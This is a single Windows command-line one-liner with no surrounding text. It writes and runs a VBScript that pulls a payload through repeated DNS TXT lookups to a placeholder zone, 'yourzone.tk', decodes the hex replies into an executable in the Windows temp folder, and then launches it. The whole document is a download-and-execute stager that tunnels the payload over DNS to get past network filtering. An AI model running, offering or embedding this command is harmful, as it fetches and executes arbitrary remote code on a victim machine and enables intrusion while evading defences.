cmd /C "(echo On Error Resume Next& echo Set objShell = CreateObject^("WScript.Shell"^)& echo Set writer = CreateObject^("Scripting.FileSystemObject"^).createtextfile^("c:\windows\temp\out.exe"^)& echo For d = 1 To 472& echo pos = 0& echo While pos = 0& echo Set exec = objShell.Exec^("nslookup -type=txt d"^&d^&".txt.yourzone.tk"^)& echo res = exec.Stdout.ReadAll^(^)& echo pos = inStr^(1,res,"?"^)& echo txt = Mid^(res,pos+1,253^)& echo Wend& echo For b = 0 To Len^(txt^)/2-1& echo writer.Write Chr^(CInt^("^&H" ^& Mid^(txt,1+b*2,2^)^)^)& echo Next& echo Next)>%TMP%\1.vbs & cscript %TMP%\1.vbs & c:\windows\temp\out.exe"
